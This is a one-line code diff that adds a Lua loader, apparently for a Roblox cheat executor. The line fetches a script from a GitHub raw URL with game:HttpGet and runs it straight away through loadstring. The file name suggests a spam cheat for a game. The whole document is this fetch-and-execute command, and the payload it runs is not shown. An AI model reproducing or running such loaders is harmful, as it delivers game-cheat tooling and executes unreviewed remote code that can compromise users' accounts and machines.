@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/upd-paint-to-get-rich-spam6-j8u21f3eo0s2iq.lua"))()
